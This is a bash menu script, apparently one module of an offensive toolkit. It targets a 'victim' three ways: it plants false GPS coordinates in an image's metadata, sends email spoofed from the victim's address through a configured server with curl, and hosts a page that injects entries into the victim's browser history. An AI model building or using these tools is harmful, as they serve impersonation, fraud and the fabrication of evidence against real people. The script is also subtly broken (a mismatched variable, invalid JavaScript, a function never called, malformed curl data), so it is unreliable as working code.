clear
while :
do
echo ""
echo "Other"
echo "--------------------------------------"
echo ""
echo "  1.- Metadata Injection with victim GPS Coordinates"
echo "  2.- Send an Email from victim Email Address (Email Spoofing)"
echo "  3.- Modify victim browser history"
echo ""
echo "  99.- Exit"
echo "--------------------------------------"
echo -n "Select an option [Other]> "
read op7
case $op7 in
1) echo "[*] Selected: Metadata Injection";
echo -n "Image Path [MetadataInjection]> "
read img1
echo -n "Victim GPS Latitude Coordinates [MetadataInjection]> "
read lgps1
echo -n "Victim GPS Longitude Coordinates [MetadataInjection]> "
read logps1
exiftool -exif:gpslatitude="$lgps" -exif:gpslatituderef=S -exif:gpslongitude="$logps1" -exif:gpslongituderef=E  $img1
echo "[+] Metadata Injected in the image";
exit
;;
2) echo "[*] Selected: Mail Spoofing";
echo -n "Victim Email (From) [MailSpoof]> "
read from0
echo -n "To [MailSpoof]> "
read to6
echo -n "Subject [MailSpoof]> "
read sub
echo -n "Message [MailSpoof]> "
read msg
echo "[*] The configured server to send message is: $(cat config/server.txt)"
echo "[*] Sending Message..."
curl --data "from=$from0 && subject=$sub && msg=$msg && to=$to6" $(cat config/server.txt)
echo "[+] Message sent to: $to6"
exit
;;
3) echo "[*] Selected: History Injection";
echo -n "Inserte la pagina que desea inyectar en el historial de la victima [HistoryInject]> "
read histinject
echo "<!DOCTYPE html>
<html>
       <head>
              <title></title>
       </head>
       <body>
              <script>
                       Function insertar() {
                                  history.pushState({}, '', '$histinject.html');
                                           }
              </script>
       </body>
</html>
" > /var/www/html/index.html
echo "[*] Starting apache2 server on port 80..."
/etc/init.d/apache2 start
echo "[+] Server started"
echo "Send to victim: <Your IP>:80/index.html"
exit
;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op7 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done
